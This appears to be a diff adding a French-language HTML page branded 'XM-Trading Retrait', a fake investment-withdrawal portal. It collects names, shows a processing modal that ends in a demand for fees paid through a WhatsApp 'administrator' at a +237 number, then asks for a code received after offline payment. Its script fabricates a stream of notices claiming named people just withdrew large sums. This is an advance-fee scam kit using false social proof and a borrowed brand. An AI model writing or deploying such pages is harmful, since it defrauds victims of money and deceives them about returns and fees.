@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Retrait d’investissement</title>
+  <!-- Google Font Montserrat -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    /* (Votre CSS inchangé) */
+    /* Reset minimal */
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: 'Montserrat', Arial, sans-serif;
+      background-color: #f5f5f5; color: #333;
+      line-height: 1.6; display: flex;
+      flex-direction: column; position: relative;
+      overflow-x: hidden;
+    }
+    a { color: #007bff; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Header */
+    header.site-header {
+      background-color: #000; color: #fff;
+      padding: 15px 20px; display: flex;
+      align-items: center; justify-content: space-between;
+    }
+    header.site-header h1 { font-size: 1.5rem; font-weight: 600; }
+    header.site-header nav a { margin-left: 20px; font-weight: 500; color: #fff; }
+    header.site-header nav a:hover { color: #007bff; }
+
+    /* Container principal */
+    .container {
+      flex: 1; max-width: 700px; width: 100%;
+      margin: 20px auto; background-color: #fff;
+      padding: 25px 30px; border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      position: relative; z-index: 1;
+    }
+    .container h2 { margin-bottom: 15px; font-size: 1.4rem; color: #000; }
+    .container p { margin-bottom: 15px; }
+    form label { display: block; margin-bottom: 5px; font-weight: 500; color: #222; }
+    form input[type="text"],
+    form input[type="number"],
+    form select {
+      width: 100%; padding: 10px; margin-bottom: 15px;
+      border: 1px solid #ccc; border-radius: 4px;
+      font-size: 1rem;
+    }
+    form input[type="tel"] {
+      width: calc(100% - 80px); padding: 10px;
+      margin-bottom: 15px; border: 1px solid #ccc;
+      border-radius: 4px; margin-left: 80px;
+      font-size: 1rem;
+    }
+    .phone-prefix { position: relative; margin-bottom: 15px; }
+    .phone-prefix span {
+      position: absolute; left: 10px; top: 50%;
+      transform: translateY(-50%); font-size: 0.95rem;
+      color: #555;
+    }
+    .phone-prefix input { padding-left: 55px; }
+    input::placeholder { color: #999; }
+
+    /* Boutons */
+    button, input[type="submit"] {
+      background-color: #007bff; color: white;
+      border: none; padding: 12px 20px;
+      cursor: pointer; border-radius: 4px;
+      font-size: 1rem; font-weight: 500;
+      transition: background-color 0.2s ease;
+    }
+    button:hover, input[type="submit"]:hover { background-color: #0056b3; }
+
+    /* Modal overlay */
+    .modal-overlay {
+      position: fixed; top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0,0,0,0.6);
+      display: flex; align-items: center;
+      justify-content: center; z-index: 1000;
+      visibility: hidden; opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+    .modal-overlay.active { visibility: visible; opacity: 1; }
+    .modal-content {
+      background-color: #fff; padding: 25px 20px;
+      width: 90%; max-width: 500px;
+      border-radius: 8px; text-align: left;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+    .modal-content p { font-size: 1rem; margin-bottom: 15px; color: #222; }
+    .progress-bar-container {
+      width: 100%; background-color: #e0e0e0;
+      border-radius: 4px; overflow: hidden;
+      margin: 20px 0;
+    }
+    .progress-bar {
+      width: 0%; height: 20px;
+      background-color: #007bff;
+      transition: width 0.3s ease;
+    }
+
+    /* Style du message d’alerte urgent */
+    #feeSection p#feeMessage {
+      margin-top: 15px; font-size: 0.95rem; line-height: 1.4;
+      background-color: #f8d7da; /* fond rouge clair */
+      border: 1px solid #f5c2c7; /* bordure rouge */
+      color: #842029; /* texte rouge foncé */
+      padding: 12px; border-radius: 4px;
+    }
+    #feeSection p a { color: #d9534f; font-weight: 500; }
+
+    /* Section code masquée jusqu'au lien param ?code= */
+    #code-section { display: none; }
+
+    /* Section succès inline */
+    #success-section {
+      display: none; margin-top: 20px; text-align: center;
+    }
+    #success-section h2 {
+      font-size: 1.6rem; margin-bottom: 15px; color: #fff;
+    }
+    #success-section p {
+      margin-bottom: 10px; color: #fff; font-size: 1rem;
+    }
+    body.success-mode {
+      background-image: url('success-bg.jpg');
+      background-size: cover; background-position: center;
+      color: #fff;
+    }
+    body.success-mode .container {
+      background-color: rgba(0,0,0,0.7); color: #fff;
+    }
+
+    /* Footer */
+    footer.site-footer {
+      background-color: #000; color: #ccc;
+      padding: 15px 20px; text-align: center;
+      font-size: 0.9rem;
+    }
+    footer.site-footer a { color: #007bff; }
+    footer.site-footer a:hover { color: #fff; }
+
+    /* Notifications ambiantes centrées */
+    .notif-container {
+      position: fixed; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1100; display: flex;
+      flex-direction: column; align-items: center;
+      gap: 10px; pointer-events: none;
+      width: auto; max-width: 80%;
+    }
+    .notif {
+      background-color: rgba(0, 0, 0, 0.85);
+      color: #fff; padding: 12px 18px;
+      border-radius: 6px; font-size: 1rem;
+      opacity: 0; animation: notifFade 3s ease forwards;
+      display: flex; align-items: center; gap: 8px;
+    }
+    @keyframes notifFade {
+      0% { opacity: 0; transform: translateY(20px) scale(0.9); }
+      10% { opacity: 1; transform: translateY(0) scale(1); }
+      70% { opacity: 1; transform: translateY(0) scale(1); }
+      100% { opacity: 0; transform: translateY(-20px) scale(0.9); }
+    }
+    @media (max-width: 600px) {
+      header.site-header, footer.site-footer {
+        flex-direction: column; text-align: center;
+      }
+      header.site-header nav a { margin: 8px; }
+      .container { margin: 15px; padding: 20px; }
+      .modal-content { padding: 20px; }
+      .notif-container { top: 40%; max-width: 90%; }
+    }
+  </style>
+</head>
+<body id="page-index">
+  <!-- En-tête -->
+  <header class="site-header">
+    <div class="logo">
+      <h1>XM-Trading Retrait</h1>
+    </div>
+    <nav>
+      <a href="#initial-section">Accueil</a>
+      <a href="#initial-section">Demande</a>
+      <a href="#footer-contact">Contact</a>
+    </nav>
+  </header>
+
+  <!-- Contenu principal -->
+  <div class="container">
+    <!-- SECTION 1 : Formulaire initial -->
+    <div id="initial-section">
+      <h2>Demande de retrait</h2>
+      <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
+        <input type="hidden" name="form-name" value="withdrawal-request">
+        <p style="display:none">
+          <label>Ne pas remplir <input name="bot-field"></label>
+        </p>
+
+        <label for="firstName">Prénom</label>
+        <input type="text" id="firstName" name="firstName" placeholder="Votre prénom" required>
+
+        <label for="lastName">Nom</label>
+        <input type="text" id="lastName" name="lastName" placeholder="Votre nom de famille" required>
+
+        <!-- Nouveau champ Sexe pour salutation -->
+        <label for="gender">Sexe</label>
+        <select id="gender" name="gender" required>
+          <option value="">Sélectionnez</option>
+          <option value="Monsieur">Monsieur</option>
+          <option value="Madame">Madame</option>
+        </select>
+
+        <!-- Le reste de votre formulaire inchangé -->
+        <!-- … -->
+        <input type="submit" value="Valider la demande">
+      </form>
+    </div>
+
+    <!-- SECTION 2 : saisie du code après paiement hors-ligne -->
+    <div id="code-section">
+      <h2>Confirmation finale</h2>
+      <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
+      <form id="confirm-form">
+        <label for="newInvestmentCode">Nouveau code d’investissement</label>
+        <input type="text" id="newInvestmentCode" name="newInvestmentCode" placeholder="Entrez le code reçu" required>
+        <input type="submit" value="Valider le code">
+      </form>
+      <p id="confirmError" style="color:red; display:none;">Message d’erreur ici</p>
+    </div>
+
+    <!-- SECTION 3 : Succès -->
+    <div id="success-section">
+      <h2 id="successGreeting"></h2>
+      <p>Votre demande de retrait a été traitée avec succès.</p>
+      <p>L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
+      <p>Le montant sera versé selon les modalités convenues.</p>
+      <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div id="progressModal" class="modal-overlay">
+    <div class="modal-content">
+      <p id="progressText">Traitement en cours...</p>
+      <div class="progress-bar-container">
+        <div id="progressBar" class="progress-bar"></div>
+      </div>
+      <div id="feeSection" style="display: none;">
+        <p id="feeMessage" class="fee-message"></p>
+        <p>
+          Contactez votre administrateur sur WhatsApp :<br>
+          <a href="tel:+2376XXXXXXX">+237 6XXXXXXX</a>
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notifications ambiantes centrées -->
+  <div class="notif-container" id="notifContainer"></div>
+
+  <!-- Footer -->
+  <footer class="site-footer" id="footer-contact">
+    <p>&copy; 2025 XM-Trading. Tous droits réservés.</p>
+    <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp : +237 6XXXXXXX</p>
+  </footer>
+
+  <script>
+    // Vos données pays, fonctions formatAmount, randInt, etc. inchangées…
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // … votre initialisation formulaire et modal ici …
+
+      // GÉNÉRATION D’UNE LISTE DE 1 000 NOMS AFRICAINS UNIQUES
+      const firstNames = [
+        "Amina","Fatou","Zainab","Mariama","Aïcha","Nana","Grace","Linda","Joyce","Chantal",
+        "Adama","Faty","Salimata","Naima","Khadija","Halima","Koffi","Moussa","Ousmane","Ibrahim",
+        "Samuel","Emmanuel","Jacques","Issa","Youssouf","Habib","Amadou","Seydou","Kwame","Kojo",
+        "Nia","Abena","Ama","Chika","Tafara","Tendai","Zuri","Thandiwe","Ayo","Binta"
+      ];
+      const lastNames = [
+        "Diallo","Traoré","Coulibaly","Koné","Diop",
+        "Cissé","Touré","Kamara","Sissoko","Doumbia",
+        "Keita","Sow","Maiga","Sidibé","Diarra",
+        "Bah","Jalloh","Conteh","Koroma","Kanoute",
+        "Ndlovu","Mthembu","Okeke","Abebe","Ncube"
+      ];
+      // Compose enchaînement jusqu’à 1 000 prénoms + noms
+      const africanNames = [];
+      for (let i = 0; i < firstNames.length && africanNames.length < 1000; i++) {
+        for (let j = 0; j < lastNames.length && africanNames.length < 1000; j++) {
+          africanNames.push(`${firstNames[i]} ${lastNames[j]}`);
+        }
+      }
+
+      // Dans vos fonctions de notification, utilisez désormais ce africanNames sans répétition
+      function showRandomNotification() {
+        if (africanNames.length === 0) return;
+        // Prendre et retirer le premier nom pour ne plus le réutiliser
+        const name = africanNames.shift();
+        const useFCFA = Math.random() < 0.6;
+        const amount = useFCFA
+          ? randInt(500000, 5000000)
+          : randInt(300, 5000);
+        const currency = useFCFA ? 'FCFA' : 'USD';
+        const text = `🎉 ${name} vient de retirer ${formatAmount(amount, currency)}`;
+        const notif = document.createElement('div');
+        notif.className = 'notif';
+        notif.textContent = text;
+        document.getElementById('notifContainer').appendChild(notif);
+        setTimeout(() => notif.remove(), 3000);
+      }
+
+      // Planification des notifications ambiantes
+      (function scheduleNotif(){
+        const delay = randInt(3000, 6000);
+        setTimeout(() => {
+          showRandomNotification();
+          scheduleNotif();
+        }, delay);
+      })();
+
+      // … le reste de votre code (formulaires, modals, enterSuccessMode, etc.) …
+    });
+  </script>
+</body>
+</html>
